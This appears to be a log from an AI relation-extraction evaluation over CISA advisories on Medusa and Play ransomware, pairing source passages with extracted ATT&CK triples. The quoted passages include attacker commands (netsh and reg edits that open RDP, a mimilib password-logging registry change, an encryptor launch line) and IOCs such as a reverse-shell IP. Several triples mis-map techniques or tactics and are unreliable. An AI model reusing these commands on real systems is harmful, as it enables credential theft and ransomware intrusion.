- Medusa actors -> USES -> AnyDesk
  Literal support: To evade detection, they may tailor their choice based on remote access tools already present in the victim environment. 2,3 FBI identified Medusa actors using remote access software AnyDesk, Atera, ConnectWise, eHorus, N-able, BeyondTrust, SimpleHelp, and Splashtop.
- Medusa actors -> USES -> ConnectWise
  Literal support: To evade detection, they may tailor their choice based on remote access tools already present in the victim environment. 2,3 FBI identified Medusa actors using remote access software AnyDesk, Atera, ConnectWise, eHorus, N-able, BeyondTrust, SimpleHelp, and Splashtop.
- PsExec -> USES_TECHNIQUE -> T1021.001
  Literal support: Medusa actors use these tools—in combination with Remote Desktop Protocol (RDP) [T1021.001] and PsExec [T1569.002]—to move laterally [TA0008] through the network and identify files for exfiltration [TA0010] and encryption [T1486].

## AA25-071A:evaluation:llama500:14289:16172

Status: candidates_ready_for_review
Case time: 2.60 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a

Exact source window:

] and PsExec [T1569.002]—to move laterally [TA0008] through the network and identify files for exfiltration [TA0010] and encryption [T1486]. When provided with valid username and password credentials, Medusa actors use PsExec to:
Copy (-c) one script from various batch scripts on the current machine to the remote machine and execute it with system-level privileges (-s).
Execute an already existing local file on a remote machine with system-level privileges.
Execute remote shell commands using cmd /c.
One of the batch scripts executed by PsExec is openrdp.bat, which first creates a new firewall rule to allow inbound TCP traffic on port 3389:
netsh advfirewall firewall add rule name="rdp" dir=in protocol=tcp localport=3389 action=allow
Then, a rule to allow remote WMI connections is created:
netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes
Finally, the registry is modified to allow Remote Desktop connections:
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
(Updated Aug. 18, 2026) Medusa actors use Mimikatz, the Windows Task Manager, and comsvcs.dll for LSASS dumping [T1003.001] to harvest credentials [TA0006] and aid lateral movement. They disable Windows Defender using the local Group Policy Editor during the LSASS exfiltration and re-enable Defender when they are done with exfiltration.
(Updated Aug. 18, 2026) Additionally, they use Mimikatz’s tool mimilib.dll to steal credentials directly from the LSA authentication mechanism, which allows them to record plaintext passwords to a log file saved in C:\Windows\System32\kiwissp.log. This is accomplished by adding the following data to the registry:
reg add hklm\system\currentcontrolset\control\lsa\ /v “Security Packages” /d “Kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0mimilib” /t REG_MULTI_SZ /f


- T1569.002 -> PART_OF_TACTIC -> TA0008
  Literal support: ] and PsExec [T1569.002]—to move laterally [TA0008] through the network and identify files for exfiltration [TA0010] and encryption [T1486].
- T1486 -> PART_OF_TACTIC -> TA0010
  Literal support: ] and PsExec [T1569.002]—to move laterally [TA0008] through the network and identify files for exfiltration [TA0010] and encryption [T1486].
- Medusa actors -> USES -> PsExec
  Literal support: When provided with valid username and password credentials, Medusa actors use PsExec to:
- T1003.001 -> PART_OF_TACTIC -> TA0006
  Literal support: (Updated Aug. 18, 2026) Medusa actors use Mimikatz, the Windows Task Manager, and comsvcs.dll for LSASS dumping [T1003.001] to harvest credentials [TA0006] and aid lateral movement.

## AA25-071A:evaluation:llama500:16025:18061

Status: candidates_ready_for_review
Case time: 3.10 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a

Exact source window:

 add hklm\system\currentcontrolset\control\lsa\ /v “Security Packages” /d “Kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0mimilib” /t REG_MULTI_SZ /f
(Updated Aug. 18, 2026) Medusa actors have also been observed stealing credentials using Volume Shadow Copy. The actors use the vssadmin command to create a new shadow copy for the C: drive. The actors then copy ntds.dit, system, and security registry hives out of the shadow copy and delete the shadow copy to prevent discovery [T1006]. The actors can use the stolen files to create forged Kerberos tickets [T1558], effectively compromising the entire domain.
(Updated Aug. 18, 2026) The actors used CrackMapExec (aka NetExec, aka NXC) to enumerate hosts on the network. The information collected included IP address, hostname, operating system (OS) information, and other metadata.
(Updated Aug. 18, 2026) Medusa actors make changes to Active Directory Default Domain Policy settings to override Group Policy settings [T1484.001]. Specifically, Medusa actors set the Default Domain Policy to “Enabled, Enforced.” This setting enforces the policy set by Medusa actors, overriding stricter Group Policies that would normally restrict threat actor activity.
Exfiltration and Impact
(Updated, Aug. 18, 2026) Medusa actors install and use Bandizip to create archives of exfiltration files and Rclone to facilitate exfiltration of data to the Medusa C2 servers [T1567.002].
(Updated, Aug. 18, 2026) Medusa actors obfuscate rclone.exe and associated rclone.conf files by renaming the files (for example, to lsp.exe and ngconf.txt). Medusa actors exfiltrate small batches of files—for example, credential files or registry hives—using rdpclip.exe, RDP’s built-in file transfer mechanism.
The actors use Sysinternals PsExec, PDQ Inventory/Deploy, or BigFix [T1072] to deploy the encryptor, gaze.exe, on files across the network—with the actors disabling Windows Defender and other antivirus services on specific targets.
(Updated Aug. 18, 2026) Medusa actors use a custom PDQ Deploy playbook to:


- Medusa actors -> USES_TECHNIQUE -> T1567.002
  Literal support: (Updated, Aug. 18, 2026) Medusa actors install and use Bandizip to create archives of exfiltration files and Rclone to facilitate exfiltration of data to the Medusa C2 servers [T1567.002].
- gaze.exe -> USES_TECHNIQUE -> T1072
  Literal support: The actors use Sysinternals PsExec, PDQ Inventory/Deploy, or BigFix [T1072] to deploy the encryptor, gaze.exe, on files across the network—with the actors disabling Windows Defender and other antivirus services on specific targets.
- Medusa actors -> USES_TECHNIQUE -> T1484.001
  Literal support: (Updated Aug. 18, 2026) Medusa actors make changes to Active Directory Default Domain Policy settings to override Group Policy settings [T1484.001].
- Medusa actors -> USES -> Rclone
  Literal support: (Updated, Aug. 18, 2026) Medusa actors install and use Bandizip to create archives of exfiltration files and Rclone to facilitate exfiltration of data to the Medusa C2 servers [T1567.002].

## AA25-071A:evaluation:llama500:17810:20469

Status: candidates_ready_for_review
Case time: 3.07 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a

Exact source window:

, or BigFix [T1072] to deploy the encryptor, gaze.exe, on files across the network—with the actors disabling Windows Defender and other antivirus services on specific targets.
(Updated Aug. 18, 2026) Medusa actors use a custom PDQ Deploy playbook to:
Run a PowerShell base64 encoded command to exclude the entire C: drive from Windows Defender.
Use robocopy to copy gaze.exe into C:\Windows\System32\ via the RunFileCopy.cmd script.
Verify if gaze.exe exists, then run it via the command.cmd script.
Use command.cmd script to return a print statement indicating if gaze.exe was found.
(Updated Aug. 18, 2026) The actors do not use PDQ Deploy for Linux environments. Instead, they use Secure File Transfer Protocol (SFTP) to transfer the encryptor, gaze.py, to the targeted machines. They execute the encryptor using the command nohup python gaze.py &. Medusa actors also make use of an ESXi host profile [T1675] to change root passwords on Linux machines.
Encrypted files have a .medusa file extension. The process gaze.exe terminates all services [T1489] related to backups, security, databases, communication, file sharing, and websites, and then deletes shadow copies and encrypts files with AES-256 before dropping the ransom note. Next, the actors remotely turn off [T1529] virtual machines, encrypt them, and delete their previously installed tools [T1070].
Extortion
Medusa RaaS uses a double-extortion model, where victims must pay [T1657] to decrypt files and prevent further release of their data. The ransom note demands victims make contact within 48 hours via either a Tor browser-based live chat, or via Tox, an end-to-end encrypted instant-messaging platform. If the victim does not respond to the ransom note, Medusa actors contact victims directly by phone or email. Medusa operates a .onion data leak site divulging victims alongside countdowns to the release of information.
(Updated Aug. 18, 2026) Medusa actors post ransom demands on the leak site with direct hyperlinks to Medusa-affiliated cryptocurrency wallets and claimed number of views. Victims that are still actively negotiating sometimes do not appear on the ransom site, and the Medusa actors use the threat of posting victims as negotiation leverage. Medusa actors offer a “lower rate” for quick payments, stating that discounts will expire after an arbitrary amount of time. Additionally, Medusa actors research victim financial details and base their demands on publicly posted revenue. After a victim pays the ransom, Medusa actors claim to remove the victim’s information from the site. Note: There is no way to verify that Medusa actors remove victim data from the site.


- gaze.exe -> USES_TECHNIQUE -> T1072
  Literal support: , or BigFix [T1072] to deploy the encryptor, gaze.exe, on files across the network—with the actors disabling Windows Defender and other antivirus services on specific targets.
- Medusa actors -> USES -> PDQ Deploy
  Literal support: (Updated Aug. 18, 2026) Medusa actors use a custom PDQ Deploy playbook to:
- Medusa actors -> USES_TECHNIQUE -> T1675
  Literal support: Medusa actors also make use of an ESXi host profile [T1675] to change root passwords on Linux machines.
- gaze.exe -> USES_TECHNIQUE -> T1489
  Literal support: The process gaze.exe terminates all services [T1489] related to backups, security, databases, communication, file sharing, and websites, and then deletes shadow copies and encrypts files with AES-256 before dropping the ransom note.

## AA25-071A:evaluation:llama500:20162:22243

Status: empty_extraction
Case time: 0.48 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a

Exact source window:

 time. Additionally, Medusa actors research victim financial details and base their demands on publicly posted revenue. After a victim pays the ransom, Medusa actors claim to remove the victim’s information from the site. Note: There is no way to verify that Medusa actors remove victim data from the site.
Medusa concurrently advertises sale of the data to interested parties before the countdown timer ends. Victims can pay $10,000 USD in cryptocurrency to add a day to the countdown timer.
(Updated Aug. 18, 2026) Medusa actors generally request payment in Bitcoin but may demand payment in other cryptocurrencies.
FBI investigations identified that after paying the ransom, one victim was contacted by a separate Medusa actor who claimed the negotiator had stolen the ransom amount already paid and requested half of the payment be made again to provide the “true decryptor”—potentially indicating a triple-extortion scheme, or operational dysfunction and a lack of cohesion among ransomware group.
Indicators of Compromise
Table 1 and Table 2 are lists of the malicious IP addresses, the URLs, and the hashes of files obtained during FBI investigations.
Disclaimer: Some of these indicators may be legitimate. The authoring agencies recommend organizations investigate or vet the IOCs prior to taking action, such as blocking.
Table 1. Indicators of Compromise (Updated Aug. 18, 2026)
IOC
Type
Description
143.244.47[.]89
IP Address
IP used to access PHP Web Shell (Mullvad VPN)
167.88.166[.]173
IP Address
Ligolo proxy IP
https://3324.requestcatcher[.]com/hihi
URL
Additional URL associated with Ligolo commands
143.110.243[.]154 aka erp.ranasons[.]com
IP Address & URL
Exfiltration IP/domain
185.238.231[.]16
IP Address
IP used to access BeyondTrust session (ExpressVPN)
23.234.89[.]195
IP Address
IP used to access BeyondTrust session (Mullvad VPN)
146.70.172[.]247
IP Address
IP used to access BeyondTrust session (Mullvad VPN)
155.2.215[.]71
IP Address
IP used to access BeyondTrust session
23.234.106[.]242
IP Address
IP used to access BeyondTrust session (Mullvad VPN)



## AA25-071A:evaluation:llama500:22047:23538

Status: empty_extraction
Case time: 0.39 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a

Exact source window:

IP used to access BeyondTrust session (Mullvad VPN)
155.2.215[.]71
IP Address
IP used to access BeyondTrust session
23.234.106[.]242
IP Address
IP used to access BeyondTrust session (Mullvad VPN)
23.234.93[.]112
IP Address
IP used to access BeyondTrust session (Mullvad VPN)
37.19.21[.]180
IP Address
IP used to access BeyondTrust session (Mullvad VPN)
155.2.215[.]69
IP Address
IP used to access BeyondTrust session
185.238.231[.]98
IP Address
IP used to access BeyondTrust session (ExpressVPN)
37.221.66[.]239
IP Address
Bash TCP reverse shell destination
185.135.86[.]185
IP Address
IP associated with SimpleHelp session
83.138.53[.]139
IP Address
IP associated with Nezha backdoor
185.238.231[.]4
IP Address
IP used to access BeyondTrust session (ExpressVPN)
185.238.231[.]77
IP Address
IP used to access BeyondTrust session (ExpressVPN)
185.238.231[.]85
IP Address
IP used to access BeyondTrust session (ExpressVPN)
85.155.186[.]121
IP Address
IP associated with SimpleHelp session
http//45.61.150[.]94:8000/storm[.]exe
URL
SimpleHelp agent was downloaded to victim using this IP
94.156.67[.]145
IP Address
IP associated with backdoor
Table 2. Malicious Files (Updated Aug. 18, 2026)
File
Hash (MD5, SHA1, or SHA 256)
Description
!!!READ_ME_MEDUSA!!!.txt
Redacted
Ransom note file
j.exe
2C7F328FEEB94608AAAF99EC70CB0323
MeshAgent remote management tool
def.exe
D796259C44BE852327623FD2E40C47F2
Rootkit
nezha-agent.exe
4D0B6E3C9C33550A005E41663A1977CB
Nezha monitoring agent
mimilib.dll



## AA25-071A:evaluation:llama500:23412:24966

Status: empty_extraction
Case time: 0.44 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a

Exact source window:


D796259C44BE852327623FD2E40C47F2
Rootkit
nezha-agent.exe
4D0B6E3C9C33550A005E41663A1977CB
Nezha monitoring agent
mimilib.dll
eb05429d25fc57b476428cdb0a134b2f
Mimikatz password logger
command.cmd
04b13b6cd5e5291b1cde78975a140feea
7fd3bc3777c53caa1ab33426c83bfcc
PDQ Deploy script to run gaze.exe
RunFileCopy.cmd
b29defbbc4ebaa243c1712ccc4943374f
1b6fb864c39ed9f70fceb17eee098db
PDQ Deploy script to copy gaze.exe to system32
openrdp.bat
44370f5c977e415981febf7dbb87a85c
Allows incoming RDP and remote WMI connections
Ngconf.txt
8f11d9067da087cb4185fa804caac2df
RClone configuration file
Main_new.exe
2df705c9be0465f1c73a9f5d35147723deb16b5e
SimpleHelp executable
MITRE ATT&CK Tactics and Techniques
See Table 3 – Table 12 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Table 3: Initial Access
Tactic/Technique Title
ID
Use
Exploit Public-Facing Application
T1190
Medusa actors exploit unpatched software or n-day vulnerabilities through CVEs.
Initial Access
TA0001
Medusa actors recruit IABs in cybercriminal forums and marketplaces to obtain initial access.
Phishing
T1566
Medusa IABs use phishing campaigns as a primary method for delivering ransomware to victims.
Table 4: Stealth
Technique Title
ID
Use
Indicator Removal: Clear Command History
T1070.003
Medusa actors attempt to cover their tracks by deleting the PowerShell command line history.



## AA25-071A:evaluation:llama500:24695:26937

Status: candidates_ready_for_review
Case time: 3.00 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a

Exact source window:

 IABs use phishing campaigns as a primary method for delivering ransomware to victims.
Table 4: Stealth
Technique Title
ID
Use
Indicator Removal: Clear Command History
T1070.003
Medusa actors attempt to cover their tracks by deleting the PowerShell command line history.
Obfuscated Files or Information: Encrypted/Encoded File
T1027.013
Medusa actors use a well-known stealth technique that executes a base64 encrypted command.
Obfuscated Files or Information
T1027
Medusa actors obfuscate a string by slicing it into pieces and referencing it via a variable.
Indicator Removal
T1070
Medusa actors delete their previous work and tools installed.
Disable or Modify Tools
T1685
Medusa actors kill or delete EDR tools.
Direct Volume Access
T1006
Medusa actors use vssadmin to bypass Windows file access controls and file system monitoring tools to obtain copies of registry hives.
Hide Artifacts: File/Path Exclusions
T1564.012
(Updated Aug. 18, 2026) Medusa actors operate in pre-existing excluded folders within Windows Defender.
Table 5: Discovery
Technique Title
ID
Use
Network Service Discovery
T1046
Medusa actors used LOTL techniques to perform network enumeration.
File and Directory Discovery
T1083
Medusa actors use Windows Command Prompt for filesystem enumeration.
Network Share Discovery
T1135
Medusa actors query shared drives on the local system to gather sources of information.
System Network Configuration Discovery
T1016
Medusa actors use OS administrative utilities to gather network information.
System Information Discovery
T1082
Medusa actors use the command systeminfo to gather detailed system information.
System Owner/User Discovery
T1033
Medusa actors use the command query user to gather information about the currently logged in user.
System Network Connections Discovery
T1049
Medusa actors use the command netstat -a to gather a listing of network connections.
Permission Groups Discovery: Domain Groups
T1069.002
Medusa actors attempt to find domain-level group and permission settings.
Table 6: Credential Access
Technique Title
ID
Use
OS Credential Dumping: LSASS Memory
T1003.001
Medusa actors access credential material stored in process memory or LSASS using Mimikatz.
Steal or Forge Kerberos Tickets
T1558


- Medusa actors -> USES -> Windows Command Prompt
  Literal support: Medusa actors use Windows Command Prompt for filesystem enumeration.
- Medusa actors -> USES -> systeminfo
  Literal support: Medusa actors use the command systeminfo to gather detailed system information.
- Medusa actors -> USES -> netstat
  Literal support: Medusa actors use the command netstat -a to gather a listing of network connections.
- Medusa actors -> USES -> Mimikatz
  Literal support: Medusa actors access credential material stored in process memory or LSASS using Mimikatz.

## AA25-071A:evaluation:llama500:26712:28840

Status: candidates_ready_for_review
Case time: 2.97 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a

Exact source window:

Table 6: Credential Access
Technique Title
ID
Use
OS Credential Dumping: LSASS Memory
T1003.001
Medusa actors access credential material stored in process memory or LSASS using Mimikatz.
Steal or Forge Kerberos Tickets
T1558
(Updated Aug. 18, 2026) Medusa actors steal credentials by copying Windows database files and using them to create forged Kerberos tickets.
Table 7: Lateral Movement and Execution
Technique Title
ID
Use
Command and Scripting Interpreter: PowerShell
T1059.001
Medusa actors use PowerShell for ingress, network, and filesystem enumeration.
Command and Scripting Interpreter: Windows Command Shell
T1059.003
Medusa actors use Windows Command Prompt, which can be used to control almost any aspect of a system, for ingress, network, and filesystem enumeration.
Software Deployment Tools
T1072
Medusa actors use PDQ Deploy and BigFix to deploy the encryptor on files across the network.
Remote Services: Remote Desktop Protocol
T1021.001
Medusa actors use RDP, a common feature of OSs, to log into an interactive session with a system and move laterally.
System Services: Service Execution
T1569.002
Medusa actors use Sysinternals PsExec to deploy the encryptor on files across the network.
Windows Management Instrumentation
T1047
Medusa actors abuse WMI to query system information.
ESXi Administration Command
T1675
(Updated Aug. 18, 2026) Medusa actors abuse ESXi administration services to force root passwords to Medusa-controlled passwords on Linux machines.
Table 8: Exfiltration and Encryption
Technique Title
ID
Use
Exfiltration Over Web Service: Exfiltration to Cloud Storage
T1567.002
Medusa actors use Rclone to facilitate exfiltration of data to the Medusa C2 servers.
Table 9: Command and Control
Technique Title
ID
Use
Ingress Tool Transfer
T1105
Medusa actors use PowerShell, Windows Command Prompt, and certutil for file ingress.
Application Layer Protocol: Web Protocols
T1071.001
Medusa actors communicate using application layer protocols associated with web traffic. In this case, Medusa actors used scripts that created reverse or bind shells over port 443: HTTPS.
Remote Access Tools


- Medusa actors -> USES -> Mimikatz
  Literal support: Medusa actors access credential material stored in process memory or LSASS using Mimikatz.
- Medusa actors -> USES -> Windows Command Prompt
  Literal support: Medusa actors use Windows Command Prompt, which can be used to control almost any aspect of a system, for ingress, network, and filesystem enumeration.
- Medusa actors -> USES -> PDQ Deploy
  Literal support: Medusa actors use PDQ Deploy and BigFix to deploy the encryptor on files across the network.
- Medusa actors -> USES -> Sysinternals PsExec
  Literal support: Medusa actors use Sysinternals PsExec to deploy the encryptor on files across the network.

## AA25-071A:evaluation:llama500:28548:30967

Status: empty_extraction
Case time: 0.56 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a

Exact source window:

 and certutil for file ingress.
Application Layer Protocol: Web Protocols
T1071.001
Medusa actors communicate using application layer protocols associated with web traffic. In this case, Medusa actors used scripts that created reverse or bind shells over port 443: HTTPS.
Remote Access Tools
T1219
Medusa actors used remote access software to move laterally through the network.
Table 10: Persistence
Technique Title
ID
Use
Create Account
T1136.002
Medusa actors created a domain account to maintain access to victim systems.
Table 11: Privilege Escalation (Updated Aug. 18, 2026)
Technique Title
ID
Use
Domain or Tenant Policy Modification: Group Policy Modification
T1484.001
Medusa actors made changes to Active Directory Default Domain Policy settings to override Group Policy settings.
Table 12: Impact
Technique Title
ID
Use
Data Encrypted for Impact
T1486
Medusa identified and encrypted data on target systems to interrupt availability to system and network resources.
Inhibit System Recovery
T1490
The process gaze.exe terminates all services and then deletes shadow copies and encrypts files with AES-256 before dropping the ransom note.
Financial Theft
T1657
Victims must pay to decrypt files and prevent further release by Medusa actors.
System Shutdown/Reboot
T1529
Medusa actors remotely turned off and encrypted virtual machines.
Service Stop
T1489
The process gaze.exe terminates all services related to backups, security, databases, communication, file sharing, and websites.
Incident Response
If a potential compromise is detected, but ransomware actors have not yet encrypted items, organizations should take the following actions:
Determine which hosts were compromised and isolate them by quarantining or taking them offline.
(Updated Aug. 18, 2026) Initiate threat hunting activities to scope the intrusion. Collect and review relevant artifacts, logs, and other data to identify threat actor TTPs, compromised devices and accounts, a timeline of activity, etc. Responders should consider:
Logs left behind by threat actor tooling, such as SimpleHelp and RDP logs.
Netflow showing unusually large traffic volume coming from normally low-traffic hosts.
Report the compromise to CISA and/or the FBI (see Reporting for contact information).
(Updated Aug. 18, 2026) Apply eviction countermeasures, including those listed below, to contain the incident and eradicate the threat actor from the network.



## AA25-071A:evaluation:llama500:30061:32570

Status: empty_extraction
Case time: 0.39 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a

Exact source window:

 a potential compromise is detected, but ransomware actors have not yet encrypted items, organizations should take the following actions:
Determine which hosts were compromised and isolate them by quarantining or taking them offline.
(Updated Aug. 18, 2026) Initiate threat hunting activities to scope the intrusion. Collect and review relevant artifacts, logs, and other data to identify threat actor TTPs, compromised devices and accounts, a timeline of activity, etc. Responders should consider:
Logs left behind by threat actor tooling, such as SimpleHelp and RDP logs.
Netflow showing unusually large traffic volume coming from normally low-traffic hosts.
Report the compromise to CISA and/or the FBI (see Reporting for contact information).
(Updated Aug. 18, 2026) Apply eviction countermeasures, including those listed below, to contain the incident and eradicate the threat actor from the network.
Note: Start applying countermeasures after collecting enough threat hunting data to inform effective countermeasure selection; this will likely overlap with threat hunting activities.
Remove local administrator accounts and rotate credentials for service accounts and domain administrator accounts.
Remove C2 software—including SimpleHelp, Nezha, Cloudflared, and Ligolo—and lock down access to legitimate company remote access tools, such as ConnectWise ScreenConnect, BeyondTrust (previously Bomgar), RDP, or any other remote access method used by the company.
Ensure initial intrusion CVE is patched and any persistence on initial access machine is removed (e.g., reverse shells, web portal credentials).
Use CISA’s Eviction Strategies Tool to assemble countermeasures for a systematic eviction plan—the tool comprises Playbook-NG (a web application) and COUN7ER (a database of post-compromise countermeasures mapped to adversary TTPs).
Use Playbook-NG and COUN7ER together to assemble a systematic eviction plan, or playbook, that leverages distinct countermeasures to contain and evict cyber threat actors. The playbook features a list of recommended response actions based on threat actor TTPs and includes each action’s intended outcome, preparatory steps, and associated risks. For more information, see CISA’s Eviction Strategies Tool Fact Sheet.
Harden the network to prevent additional malicious activity (see Mitigations for guidance).
If compromise is detected and items have been encrypted, see the “Ransomware and Data Extortion Response Checklist” in CISA’s joint #StopRansomware Guide.



## AA23-352A:evaluation:llama500:3851:6199

Status: candidates_ready_for_review
Case time: 3.55 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a

Exact source window:


Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 17. See the MITRE ATT&CK Tactics and Techniques section of this advisory for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques.
Initial Access
The Play ransomware group gains initial access to victim networks through the abuse of valid accounts, likely purchased on the dark web [T1078], and exploitation of public-facing applications [T1190], specifically through known FortiOS (CVE-2018-13379 and CVE-2020-12812) and Microsoft Exchange (ProxyNotShell [CVE-2022-41040 and CVE-2022-41082]) vulnerabilities. Play ransomware actors have been observed using external-facing services [T1133] such as Remote Desktop Protocol (RDP) and Virtual Private Networks (VPN) for initial access.
Update June 4, 2025:
Multiple ransomware groups, including initial access brokers with ties to Play ransomware operators, exploited CVE-2024-57727 in remote monitoring and management (RMM) tool SimpleHelp [T1190] to conduct remote code execution [T1059.001] at many U.S.-based entities following the vulnerabilities’ disclosure on 16 January 2025.
End Update
Discovery and Defense Evasion
Play ransomware actors use tools like AdFind to run Active Directory queries [TA0007] and Grixba,1 an information-stealer, to enumerate network information [T1016] and scan for anti-virus software [T1518.001]. Actors also use tools like GMER, IOBit, and PowerTool to disable anti-virus software [T1562.001] and remove log files [T1070.001]. In some instances, cybersecurity researchers have observed Play ransomware actors using PowerShell scripts to target Microsoft Defender.2
Lateral Movement and Execution
Play ransomware actors use command and control (C2) applications, including Cobalt Strike and SystemBC, and tools like PsExec to assist with lateral movement and file execution. Once established on a network, the ransomware actors search for unsecured credentials [T1552] and use the Mimikatz credential dumper to gain domain administrator access [T1003]. According to open source reporting,3 to further enumerate vulnerabilities, Play ransomware actors use Windows Privilege Escalation Awesome Scripts (WinPEAS) [T1059] to search for additional privilege escalation paths. Actors then distribute executables [T1570] via Group Policy Objects [T1484.001].


- Play -> USES_TECHNIQUE -> T1078
  Literal support: The Play ransomware group gains initial access to victim networks through the abuse of valid accounts, likely purchased on the dark web [T1078]
- Play -> USES_TECHNIQUE -> T1133
  Literal support: Play ransomware actors have been observed using external-facing services [T1133] such as Remote Desktop Protocol (RDP) and Virtual Private Networks (VPN) for initial access.
- Play -> USES_TECHNIQUE -> T1190
  Literal support: Multiple ransomware groups, including initial access brokers with ties to Play ransomware operators, exploited CVE-2024-57727 in remote monitoring and management (RMM) tool SimpleHelp [T1190] to conduct remote code execution [T1059.001] at many U.S.-based entities following the vulnerabilities’ disclosure on 16 January 2025.
- Play -> USES_TECHNIQUE -> T1016
  Literal support: Play ransomware actors use tools like AdFind to run Active Directory queries [TA0007] and Grixba,1 an information-stealer, to enumerate network information [T1016] and scan for anti-virus software [T1518.001].

## AA23-352A:evaluation:llama500:5924:7968

Status: candidates_ready_for_review
Case time: 3.09 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a

Exact source window:

 reporting,3 to further enumerate vulnerabilities, Play ransomware actors use Windows Privilege Escalation Awesome Scripts (WinPEAS) [T1059] to search for additional privilege escalation paths. Actors then distribute executables [T1570] via Group Policy Objects [T1484.001].
Exfiltration and Encryption
Update June 4, 2025:
The Play ransomware binary is recompiled for every attack, resulting in unique hashes for each deployment, complicating anti-malware and anti-virus program detection of the ransomware [T1027].
End Update
Play ransomware actors often split compromised data into segments and use tools like WinRAR to compress files [T1560.001] into .RAR format for exfiltration. The actors then use WinSCP to transfer data [T1048] from a compromised network to actor-controlled accounts. Following exfiltration, files are encrypted [T1486] with AES-RSA hybrid encryption using intermittent encryption, encrypting every other file portion of 0x100000 bytes.4 (Note: System files are skipped during the encryption process.) A .PLAY extension is added to file names once encrypted. Within the Windows environment, tools and a ransom note titled ReadMe[.]txt are placed in C:/Users/Public/Music/.
Impact
Update June 4, 2025:
The Play ransomware group uses a double extortion model [T1657], encrypting systems after exfiltrating data. The ransom note directs victims to contact the Play ransomware group at an email address ending in @gmx[.]de or @web[.]de. Ransom payments are paid in cryptocurrency to wallet addresses provided by Play actors. If a victim refuses to pay the ransom demand, the ransomware actors threaten to publish exfiltrated data to their leak site on the Tor network ([.]onion URL).
Play ransomware targets regularly receive phone calls from threat actors encouraging payment and threatening the release of company information. These calls can be routed to a variety of phone numbers within the organization, including those discovered in open source, such as help desks or customer service representatives.
ESXi Variant


- Play -> USES_TECHNIQUE -> T1059
  Literal support: reporting,3 to further enumerate vulnerabilities, Play ransomware actors use Windows Privilege Escalation Awesome Scripts (WinPEAS) [T1059] to search for additional privilege escalation paths.
- Play -> USES_TECHNIQUE -> T1560.001
  Literal support: Play ransomware actors often split compromised data into segments and use tools like WinRAR to compress files [T1560.001] into .RAR format for exfiltration.
- PLAY -> USES_TECHNIQUE -> T1486
  Literal support: Following exfiltration, files are encrypted [T1486] with AES-RSA hybrid encryption using intermittent encryption, encrypting every other file portion of 0x100000 bytes.4 (Note: System files are skipped during the encryption process.) A .PLAY extension is added to file names once encrypted.
- PLAY -> USES -> PLAY
  Literal support: Following exfiltration, files are encrypted [T1486] with AES-RSA hybrid encryption using intermittent encryption, encrypting every other file portion of 0x100000 bytes.4 (Note: System files are skipped during the encryption process.) A .PLAY extension is added to file names once encrypted.

## AA23-352A:evaluation:llama500:7618:10055

Status: candidates_ready_for_review
Case time: 1.69 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a

Exact source window:

onion URL).
Play ransomware targets regularly receive phone calls from threat actors encouraging payment and threatening the release of company information. These calls can be routed to a variety of phone numbers within the organization, including those discovered in open source, such as help desks or customer service representatives.
ESXi Variant
The ESXi variant of Play ransomware invokes shell commands specific to the ESXi environment to conduct tasks, including powering off all running Virtual Machines (VMs), listing machines names, and setting the welcome message of the ESXi interface to the campaign-specific ransom note. The ransomware binary supports command line arguments; however, if no command line arguments are passed, the malware powers off all VMs and encrypts files related to VMs using randomly generated per-file keys. The targeted file extensions include .vmdk, .vmem, .vmsd, .vmsn, .vmx, .vmxf, .vswp, .vmss, .nvram, .vmtx, and .log. The ransomware binary employs AES-256 as its encryption algorithm. The binary creates a copy of the ransom note titled PLAY_Readme.txt in the root directory and in the path /vmfs/volumes/, as well as the welcome message of the ESXi interface.
Like the Windows variant of Play ransomware, the ESXi variant must be recompiled for each campaign. Through command line flags, the binary supports additional functionality likely used for development and debugging, including exempting specific VMs from encryption, targeting only one file for encryption, or skipping the file extension check and attempting to encrypt all files. Please see below for YARA rules.
End Update
Leveraged Tools
Table 1 lists legitimate tools Play ransomware actors have repurposed for their operations. The legitimate tools listed in this product are all publicly available. Use of these tools and applications should not be attributed as malicious without analytical evidence to support they are used at the direction of, or controlled by, threat actors.
Table 1: Tools Leveraged by Play Ransomware Actors
Name
Description
AdFind
Used to query and retrieve information from Active Directory.
Bloodhound
Used to query and retrieve information from Active Directory.
GMER
A software tool intended to be used for detecting and removing rootkits.
IOBit
An anti-malware and anti-virus program for the Microsoft Windows operating system. Play actors have accessed IOBit to disable antivirus software.
PsExec


- Play actors -> USES -> IOBit
  Literal support: Play actors have accessed IOBit to disable antivirus software.
- Play Ransomware Actors -> USES -> Play
  Literal support: Table 1: Tools Leveraged by Play Ransomware Actors

## AA23-352A:evaluation:llama500:9760:11935

Status: candidates_ready_for_review
Case time: 5.91 seconds; attempts: 2.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a

Exact source window:

 to query and retrieve information from Active Directory.
GMER
A software tool intended to be used for detecting and removing rootkits.
IOBit
